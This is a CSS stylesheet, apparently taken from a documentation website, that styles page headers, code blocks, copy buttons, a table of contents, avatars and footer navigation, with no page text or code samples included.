@media screen and (min-width: 1024px) {
  .reset-3c756112--pageContainer-3ec6d8d0 {
    margin: 0px 88px;
  }
}
.reset-3c756112--pageHeader-15724735 {
  margin: 0;
  display: block;
  padding: 0;
  border-bottom: 2px solid #E6ECF1;
  margin-bottom: 32px;
}
.reset-3c756112--pageHeaderInner-7c0f0284 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: auto;
  margin: 0;
  display: flex;
  padding: 40px 0px;
}
@media screen and (min-width: 768px) {
  .reset-3c756112--pageHeaderInner-7c0f0284 {
    flex-wrap: wrap;
    align-items: baseline;
    flex-direction: row;
    -webkit-box-align: baseline;
    -webkit-box-lines: multiple;
    -webkit-box-orient: horizontal;
    -webkit-box-direction: normal;
  }
}
.reset-3c756112--pageHeaderWrapperContent-6897c946 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
}
.reset-3c756112--horizontalFlex-5a0077e0 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  padding: 0;
  align-items: stretch;
  justify-content: space-between;
  -webkit-box-pack: justify;
  -webkit-box-align: stretch;
}
.reset-3c756112--pageHeaderIntro-0c1463da {
  flex: 1 1 auto;
  margin: 0;
  display: block;
  padding: 0;
  padding-right: 16px;
}
.reset-3c756112--pageTitle-33dc39a3 {
  color: #242A31;
  width: 100%;
  border: none;
  margin: 0;
  display: block;
  outline: none;
  padding: 0;
  background: none;
  border-radius: 3px;
}
.text-4505230f--DisplayH900-bfb998fa--textContentFamily-49a318e1 {
  font-size: 32px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
}
.reset-3c756112--toolbar-a6a9f7d2--medium-8e46b02c--pageHeaderToolbar-6457a802--withControlsClosed-3e96e46c {
  display: -ms-inline-grid;
  margin: 0;
  display: none;
  padding: 0;
  margin-top: 9px;
  -ms-grid-rows: none;
  grid-column-gap: 16px;
  grid-template-rows: none;
}
@media screen and (max-width: 1279px) {
  .reset-3c756112--toolbar-a6a9f7d2--medium-8e46b02c--pageHeaderToolbar-6457a802--withControlsClosed-3e96e46c {
    display: block;
  }
}
.button-36063075--small-30ceeddb--button-34710834--small-54db2a94 {
  display: -webkit-inline-box;
  display: -moz-inline-box;
  display: -ms-inline-flexbox;
  display: -webkit-inline-flex;
  color: #9DAAB6;
  width: 30px;
  border: 1px solid;
  cursor: pointer;
  height: 30px;
  display: inline-flex;
  outline: none;
  padding: 0;
  transition: all 250ms ease-out;
  align-items: center;
  line-height: 1em;
  white-space: nowrap;
  border-color: transparent;
  border-radius: 3px;
  -moz-transition: all 250ms ease-out;
  justify-content: center;
  text-decoration: none;
  -webkit-box-pack: center;
  background-color: transparent;
  -webkit-box-align: center;
  -webkit-transition: all 250ms ease-out;
}
.button-36063075--small-30ceeddb--button-34710834--small-54db2a94:disabled {
  opacity: 0.5;
  pointer-events: none;
}
.button-36063075--small-30ceeddb--button-34710834--small-54db2a94:hover {
  color: #bf272e;
}
.small-3bde6db7--iconOnly-bddce91a {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  font-size: 18px;
  align-items: center;
  justify-content: center;
  -webkit-box-pack: center;
  -webkit-box-align: center;
}
.text-4505230f--UIH300-2063425d--textUIFamily-5ebd8e40--text-8ee2c8b2 {
  font-size: 14px;
  font-family: "Roboto", sans-serif;
  font-weight: 500;
  line-height: 1em;
}
.reset-3c756112--pageHeaderDescription-22970244 {
  flex: auto;
  margin: 0;
  display: block;
  padding: 0;
}
.reset-3c756112--toaster-c029690e {
  top: 16px;
  left: 50%;
  margin: 0;
  display: block;
  padding: 0;
  z-index: 160;
  position: fixed;
  transform: translateX(-50%);
}
.reset-3c756112--pageBody-a91db4ac {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  font-size: 16px;
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--container-960c7c26 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
  margin-bottom: -24px;
}
.blockParagraph-544a408c {
  color: inherit;
  margin: 0;
  position: relative;
  margin-bottom: 24px;
}
.text-4505230f--TextH400-3033861f--textContentFamily-49a318e1 {
  font-size: 16px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 400;
  line-height: 1.625;
}
.link-a079aa82--primary-53a25e66--link-faf6c434 {
  color: #3884FF;
  cursor: pointer;
  text-decoration: none;
}
.link-a079aa82--primary-53a25e66--link-faf6c434:hover {
  text-decoration: underline;
}
.bold-3c254bd9 {
  font-weight: 700;
}
.list-20526648 {
  color: #3B454E;
  margin: 0;
  padding: 0;
  padding-left: 2em;
  margin-bottom: 24px;
}
.reset-3c756112--listItemContent-756c9114 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
}
.blockParagraph-544a408c--noMargin-acdf7afa {
  color: inherit;
  margin: 0;
  position: relative;
  margin-bottom: 0;
}
.code-81e98f88 {
  margin: 0 1px;
  display: inline-block;
  padding: 3px 6px;
  font-size: 85%;
  font-family: "Source Code Pro", Menlo, monospace;
  border-radius: 3px;
  background-color: #F5F7F9;
  box-decoration-break: clone;
  -webkit-box-decoration-break: clone;
}
.code-81e98f88:after {
  content: "\00a0";
  letter-spacing: -1em;
}
.blockHeading-442b4f12--blockHeading1WithMargin-b69d755e {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  margin: 0;
  display: flex;
  position: relative;
  margin-top: 73px;
  margin-bottom: 24px;
}
.blockHeading-442b4f12--blockHeading1WithMargin-b69d755e:before {
  top: -32px;
  left: 0;
  width: 100%;
  height: 1px;
  content: " ";
  position: absolute;
  background-color: #E6ECF1;
}
.blockHeadingContent-756c9114 {
  flex: 1;
}
.text-4505230f--HeadingH700-04e1a2a3--textContentFamily-49a318e1 {
  font-size: 24px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 700;
  line-height: 1.5;
}
.blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda {
  color: #242A31;
  width: 20px;
  opacity: 0;
  transition: opacity 150ms ease;
  line-height: 1em;
  padding-left: 4px;
  -moz-transition: opacity 150ms ease;
  -webkit-transition: opacity 150ms ease;
}
.blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda:hover {
  color: #3884FF;
}
@media print {
  .blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda {
    display: none;
  }
}
.blockHeadingAnchorIcon-1c2bf3cb {
  font-size: 16px;
  vertical-align: middle;
}
.reset-3c756112--blockHeadingUp-c32402b2 {
  width: 1em;
  cursor: pointer;
  height: 1em;
  margin: 0;
  display: block;
  outline: none;
  padding: 0;
  line-height: 1em;
}
@media screen and (min-width: 768px) {
  .reset-3c756112--blockHeadingUp-c32402b2 {
    display: none;
  }
}
@media print {
  .reset-3c756112--blockHeadingUp-c32402b2 {
    display: none;
  }
}
.list-20526648--inList-acdf7afa {
  color: #3B454E;
  margin: 0;
  padding: 0;
  padding-left: 2em;
  margin-bottom: 0;
}
.blockHeading-442b4f12--blockHeading2WithMargin-532d771d {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  margin: 0;
  display: flex;
  position: relative;
  margin-top: 32px;
  margin-bottom: 24px;
}
.text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1 {
  font-size: 20px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 700;
  line-height: 1.5;
}
.reset-3c756112--codeBlockWrapper-56f27afc {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
}
.reset-3c756112--copyButtonWrapper-ca591f6e {
  top: 16px;
  right: 16px;
  margin: 0;
  display: block;
  padding: 0;
  z-index: 1;
  position: absolute;
}
@keyframes keyframes-animation-bd7e9c6a-0-1-376 {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe {
  color: #9DAAB6;
  cursor: pointer;
  margin: 0;
  display: block;
  opacity: 0.5;
  outline: none;
  padding: 8px;
  position: relative;
  font-size: 16px;
  line-height: 1em;
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe:hover {
  opacity: 1;
}
@media print {
  .reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe {
    display: none;
  }
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe:after {
  width: -webkit-max-content;
  width: -moz-max-content;
  top: calc(100% + 16px);
  left: 50%;
  color: #FFFFFF;
  width: max-content;
  bottom: auto;
  content: attr(aria-label);
  display: none;
  opacity: 0;
  padding: 5px 8px;
  z-index: 155;
  position: absolute;
  font-size: 12px;
  max-width: 300px;
  transform: translateX(-50%);
  background: #242A31;
  font-weight: 400;
  line-height: 1.625;
  white-space: normal;
  border-radius: 3px;
  animation-name: keyframes-animation-bd7e9c6a-0-1-376;
  pointer-events: none;
  text-transform: none;
  animation-duration: 0.2s;
  animation-fill-mode: forwards;
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe:before {
  top: calc(100% + 8px);
  left: 50%;
  width: 0;
  bottom: auto;
  height: 0;
  content: "";
  display: none;
  opacity: 0;
  z-index: 156;
  position: absolute;
  transform: translateX(-50%);
  border-color: #242A31 transparent;
  border-style: solid;
  animation-name: keyframes-animation-bd7e9c6a-0-1-376;
  border-top-width: 0;
  border-left-width: 8px;
  animation-duration: 0.2s;
  border-right-width: 8px;
  animation-fill-mode: forwards;
  border-bottom-width: 8px;
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe:hover:before {
  display: block;
}
.reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe:hover:after {
  display: block;
}
.reset-3c756112--codeBlock-75b39b81 {
  color: #E6ECF1;
  margin: 32px 0px;
  display: block;
  hyphens: none;
  padding: 24px 24px 24px 8px;
  overflow: auto;
  tab-size: 2;
  direction: ltr;
  font-size: 14px;
  background: #183055;
  text-align: left;
  word-break: normal;
  -ms-hyphens: none;
  font-family: "Source Code Pro", Consolas, Menlo, Monaco, Courier, monospace;
  line-height: 1.4;
  white-space: pre;
  word-spacing: normal;
  -moz-tab-size: 2;
  border-radius: 3px;
  -webkit-hyphens: none;
}
.reset-3c756112--codeBlock-75b39b81::selection {
  background: #D3DCE4;
  text-shadow: none;
}
.codeLine-a3169fbc {
  font: inherit;
  padding: 0px 0px;
  position: relative;
  word-wrap: normal;
  white-space: pre;
  padding-left: 44px;
  padding-right: 14px;
  counter-increment: line;
}
.codeLine-a3169fbc:not(:only-child):before {
  top: 2px;
  left: 4px;
  color: #5C6975;
  width: 24px;
  bottom: 0;
  content: counter(line);
  display: inline-block;
  overflow: hidden;
  position: absolute;
  font-size: 12px;
  text-align: right;
  user-select: none;
  white-space: nowrap;
  text-overflow: ellipsis;
  -ms-user-select: none;
  -moz-user-select: none;
  background-color: transparent;
  -webkit-user-select: none;
}
.codeLine-a3169fbc:only-child {
  padding-left: 30px;
}
.reset-3c756112--figure-c0d4b308--figureWithCaption-408420be {
  margin: 32px auto 24px auto;
  display: block;
  padding: 0;
}
.reset-3c756112--figureAlignCenter-2d9bf702 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  padding: 0;
  justify-content: center;
  -webkit-box-pack: center;
}
.reset-3c756112--figureLayer-b6ab7c94 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
  max-width: 100%;
}
.image-52799b3c {
  width: 100%;
  display: block;
  max-width: 100%;
  max-height: 60vh;
  object-fit: contain;
}
.zoomImage-27c3f277 {
  object-fit: contain;
}
.caption-8750cb6e {
  color: #9DAAB6;
  margin: 0;
  padding: 8px 0;
  overflow: hidden;
  word-break: normal;
}
.blockHeading-442b4f12--blockHeading3WithMargin-532d7700 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  margin: 0;
  display: flex;
  position: relative;
  margin-top: 24px;
  margin-bottom: 24px;
}
.text-4505230f--HeadingH400-686c0942--textContentFamily-49a318e1 {
  font-size: 16px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 700;
  line-height: 1.5;
}
.reset-3c756112--pageFooter-f1d5e2b0 {
  margin: 0;
  display: block;
  padding: 0;
  margin-top: 64px;
}
@media print {
  .reset-3c756112--pageFooter-f1d5e2b0 {
    display: none;
  }
}
.reset-3c756112--navPagesLinks-67bea901 {
  display: -ms-grid;
  width: auto;
  margin: 0;
  display: grid;
  padding: 0;
  -ms-grid-rows: auto;
  grid-column-gap: 24px;
  -ms-grid-columns: 1fr 1fr;
  grid-template-rows: auto;
  grid-template-areas: "previous next";
  grid-template-columns: 1fr 1fr;
}
@media screen and (max-width: 767px) {
  .reset-3c756112--navPagesLinks-67bea901 {
    grid-row-gap: 24px;
    -ms-grid-columns: 1fr;
    grid-template-areas: "next" "previous";
    grid-template-columns: 1fr;
  }
}
.reset-3c756112--card-6570f064--whiteCard-fff091a4--cardPrevious-56a5e674 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  border: 1px solid #E6ECF1;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  grid-area: previous;
  align-self: stretch;
  box-shadow: 0 3px 8px 0 rgba(116, 129, 141, 0.1);
  transition: border 250ms ease;
  align-items: center;
  justify-self: stretch;
  border-radius: 3px;
  flex-direction: row;
  -moz-transition: border 250ms ease;
  text-decoration: none;
  background-color: #FFFFFF;
  -webkit-box-align: center;
  page-break-inside: avoid;
  -ms-grid-row-align: stretch;
  -webkit-box-orient: horizontal;
  -webkit-transition: border 250ms ease;
  -ms-grid-column-align: stretch;
  -webkit-box-direction: normal;
}
.reset-3c756112--cardIcon-5b647d22 {
  flex: 0 0 auto;
  color: #9DAAB6;
  margin: 0;
  display: block;
  padding: 16px;
  font-size: 24px;
  transition: color 250ms ease;
  -moz-transition: color 250ms ease;
  -webkit-transition: color 250ms ease;
}
.reset-3c756112--cardIcon-5b647d22:first-child {
  padding-right: 0;
}
.reset-3c756112--cardIcon-5b647d22:last-child {
  padding-left: 0;
}
.reset-3c756112--cardBody-25dca3b1--cardPreviousBody-79f02c06 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 16px;
  text-align: right;
}
.reset-3c756112--cardHint-2c5d8183 {
  color: #9DAAB6;
  margin: 0;
  display: block;
  padding: 0;
}
.text-4505230f--TextH200-a3425406--textContentFamily-49a318e1 {
  font-size: 12px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 400;
  line-height: 1.625;
}
.reset-3c756112--cardTitle-32aa092e {
  margin: 0;
  display: block;
  padding: 0;
  transition: color 250ms ease;
  -moz-transition: color 250ms ease;
  -webkit-transition: color 250ms ease;
}
.text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1 {
  font-size: 16px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
}
.reset-3c756112--card-6570f064--whiteCard-fff091a4--cardNext-19241c42 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #242A31;
  border: 1px solid #E6ECF1;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  grid-area: next;
  align-self: stretch;
  box-shadow: 0 3px 8px 0 rgba(116, 129, 141, 0.1);
  transition: border 250ms ease;
  align-items: center;
  justify-self: stretch;
  border-radius: 3px;
  flex-direction: row;
  -moz-transition: border 250ms ease;
  text-decoration: none;
  background-color: #FFFFFF;
  -webkit-box-align: center;
  page-break-inside: avoid;
  -ms-grid-row-align: stretch;
  -webkit-box-orient: horizontal;
  -webkit-transition: border 250ms ease;
  -ms-grid-column-align: stretch;
  -webkit-box-direction: normal;
}
.reset-3c756112--cardBody-25dca3b1 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 16px;
}
.reset-3c756112--pageFooterColumns-ef8f347e {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  padding: 0;
  border-top: 2px solid #E6ECF1;
  margin-top: 24px;
  align-items: center;
  padding-top: 24px;
  flex-direction: row;
  -webkit-box-align: center;
  -webkit-box-orient: horizontal;
  -webkit-box-direction: normal;
}
@media screen and (max-width: 767px) {
  .reset-3c756112--pageFooterColumns-ef8f347e {
    align-items: stretch;
    flex-direction: column;
    -webkit-box-align: stretch;
    -webkit-box-orient: vertical;
    -webkit-box-direction: normal;
  }
}
.reset-3c756112--pageFooterSummary-12074aff {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
}
@media screen and (max-width: 767px) {
  .reset-3c756112--pageFooterSummary-12074aff {
    margin-bottom: 16px;
  }
}
.reset-3c756112--pageChangesSummary-08821678 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: auto;
  margin: 0;
  display: flex;
  padding: 0;
  align-items: center;
  -webkit-box-align: center;
}
.reset-3c756112--pageContributors-5c59582e {
  flex: 0 0 auto;
  margin: 0;
  display: block;
  padding: 0;
  margin-right: 8px;
}
.reset-3c756112--ownerAvatarList-696792ce {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  margin: 0;
  display: flex;
  padding: 0;
  flex-direction: row-reverse;
  -webkit-box-orient: horizontal;
  -webkit-box-direction: reverse;
}
.reset-3c756112--pageEditedDate-b805c39a {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: auto;
  color: #9DAAB6;
  margin: 0;
  display: flex;
  padding: 0;
}
.reset-3c756112--pageSide-ad9fed26 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  flex: 0 0 auto;
  width: 224px;
  margin: 0;
  display: flex;
  padding: 0;
  position: relative;
  margin-right: auto;
}
@media print {
  .reset-3c756112--pageSide-ad9fed26 {
    display: none;
  }
}
@media screen and (max-width: 1279px) {
  .reset-3c756112--pageSide-ad9fed26 {
    display: none;
  }
}
.reset-3c756112--stickyContainer-2bed3a82 {
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
  max-width: 100%;
}
.reset-3c756112--tocWrapper-506ea24c {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  height: 100%;
  margin: 0;
  display: flex;
  padding: 0;
  padding-top: 40px;
  flex-direction: column;
  padding-bottom: 40px;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114 {
  overflow-y: auto;
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
  overflow-x: hidden;
  overflow-y: overlay;
  -webkit-overflow-scrolling: touch;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar {
  width: 4px;
  height: 4px;
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar-track {
  background: none;
  border-width: 0;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
  transition: background 250ms ease;
  border-radius: 2px;
  -moz-transition: background 250ms ease;
  -webkit-transition: background 250ms ease;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar-button {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar-track-piece {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-scrollbar-corner {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114::-webkit-resizer {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114:hover::-webkit-scrollbar {
  display: initial;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114:hover::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
}
.reset-3c756112--pageSideSection-542f1fd5 {
  margin: 0;
  display: block;
  padding: 0;
  position: relative;
}
.reset-3c756112--pageSideSection-542f1fd5:before {
  top: 0;
  left: 0;
  height: 100%;
  content: " ";
  position: absolute;
  border-left: 1px solid #E6ECF1;
}
.reset-3c756112--menu-5b8a7448--pageToc-16c35922--pageTocLive-542f1fd5 {
  display: -webkit-box;
  flex: 1;
  margin: 0;
  display: flex;
  padding: 0;
  overflow: hidden;
  position: relative;
  min-width: 224px;
  counter-reset: toc;
  flex-direction: column;
  -webkit-box-orient: vertical;
  -webkit-box-direction: normal;
}
@media print {
  .reset-3c756112--menu-5b8a7448--pageToc-16c35922--pageTocLive-542f1fd5 {
    display: none;
  }
}
.reset-3c756112--menu-5b8a7448--pageToc-16c35922--pageTocLive-542f1fd5:before {
  top: 0;
  left: 0;
  height: 100%;
  content: " ";
  position: absolute;
  border-left: 1px solid #E6ECF1;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496 {
  overflow-y: auto;
  flex: 1;
  margin: 0;
  display: block;
  padding: 0;
  overflow-x: hidden;
  overflow-y: overlay;
  -webkit-overflow-scrolling: touch;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar {
  width: 4px;
  height: 4px;
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar-track {
  background: none;
  border-width: 0;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
  transition: background 250ms ease;
  border-radius: 2px;
  -moz-transition: background 250ms ease;
  -webkit-transition: background 250ms ease;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar-button {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar-track-piece {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-scrollbar-corner {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496::-webkit-resizer {
  display: none;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496:hover::-webkit-scrollbar {
  display: initial;
}
.reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496:hover::-webkit-scrollbar-thumb {
  background: rgba(0,0,0,.16);
}
.reset-3c756112--menuHeader-342906de--menuHeaderLight-2c5d8183 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  color: #9DAAB6;
  margin: 0;
  display: flex;
  padding: 0;
  padding-left: 24px;
  margin-bottom: 8px;
}
.reset-3c756112--menuHeaderIcon-0c3ed569 {
  margin: 0;
  display: block;
  padding: 0;
  margin-right: 8px;
}
.text-4505230f--InfoH100-1e92e1d1--textContentFamily-49a318e1 {
  font-size: 10px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 700;
  line-height: 1;
  letter-spacing: 1.2px;
  text-transform: uppercase;
}
.reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024 {
  display: -webkit-box;
  color: #74818D;
  cursor: pointer;
  margin: 0;
  display: flex;
  padding: 4px 16px;
  align-items: center;
  padding-left: 24px;
  vertical-align: middle;
  text-decoration: none;
  -webkit-box-align: center;
}
.reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024:hover {
  background: none;
  text-decoration: inherit;
}
.link-a079aa82--primary-53a25e66 {
  color: #3884FF;
  cursor: pointer;
  text-decoration: underline;
}
.reset-3c756112--menuItemContent-c44ec79e {
  margin: 0;
  display: block;
  padding: 0;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.text-4505230f--UIH300-2063425d--textContentFamily-49a318e1 {
  font-size: 14px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
}
.text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1 {
  font-size: 12px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
}
.text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c {
  font-size: 12px;
  font-family: Content-font, Roboto, sans-serif;
  font-weight: 500;
  line-height: 1.5;
  padding-left: 16px;
}
.reset-3c756112--figure-c0d4b308 {
  margin: 32px auto;
  display: block;
  padding: 0;
}
@keyframes keyframes-animation-bd7e9c6a-0-1-377 {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  width: 30px;
  height: 30px;
  margin: 0;
  display: flex;
  padding: 0;
  z-index: 0;
  position: relative;
  box-shadow: 0 0 0 2px white;
  border-radius: 128px;
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802:after {
  width: -webkit-max-content;
  width: -moz-max-content;
  top: calc(100% + 16px);
  left: 50%;
  color: #FFFFFF;
  width: max-content;
  bottom: auto;
  content: attr(aria-label);
  display: none;
  opacity: 0;
  padding: 5px 8px;
  z-index: 155;
  position: absolute;
  font-size: 12px;
  max-width: 300px;
  transform: translateX(-50%);
  background: #242A31;
  font-weight: 400;
  line-height: 1.625;
  white-space: normal;
  border-radius: 3px;
  animation-name: keyframes-animation-bd7e9c6a-0-1-377;
  pointer-events: none;
  text-transform: none;
  animation-duration: 0.2s;
  animation-fill-mode: forwards;
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802:before {
  top: calc(100% + 8px);
  left: 50%;
  width: 0;
  bottom: auto;
  height: 0;
  content: "";
  display: none;
  opacity: 0;
  z-index: 156;
  position: absolute;
  transform: translateX(-50%);
  border-color: #242A31 transparent;
  border-style: solid;
  animation-name: keyframes-animation-bd7e9c6a-0-1-377;
  border-top-width: 0;
  border-left-width: 8px;
  animation-duration: 0.2s;
  border-right-width: 8px;
  animation-fill-mode: forwards;
  border-bottom-width: 8px;
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802:nth-last-child(n+2) {
  margin-left: -8px;
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802:hover:before {
  display: block;
}
.reset-3c756112--tooltipContainer-7fdb9b70--tooltipped-57ae51fe--bottom-f9ec01b8--small-2ec8ae1a--circle-6c5acd10--ownerAvatarStackListItem-1b188f0f--whiteOutline-6045f802:hover:after {
  display: block;
}
.reset-3c756112--avatarFrame-2f40cdc9--small-2ec8ae1a--circle-6c5acd10 {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: -webkit-flex;
  -webkit-mask-image: -webkit-radial-gradient(white, black);
  -webkit-mask-image: -moz-radial-gradient(white, black);
  mask-image: -webkit-radial-gradient(white, black);
  mask-image: -moz-radial-gradient(white, black);
  width: 30px;
  height: 30px;
  margin: 0;
  display: flex;
  padding: 0;
  overflow: hidden;
  position: relative;
  mask-image: radial-gradient(white, black);
  align-items: center;
  border-radius: 128px;
  justify-content: center;
  -webkit-box-pack: center;
  -webkit-box-align: center;
  -webkit-mask-image: radial-gradient(white, black);
}
.reset-3c756112--innerShadow-7a3a8651 {
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  margin: 0;
  display: block;
  padding: 0;
  position: absolute;
  box-shadow: inset 0 0 1px 1px rgba(24, 48, 85, 0.1);
  border-radius: 128px;
  pointer-events: none;
}</style>
        </head>
        <body>
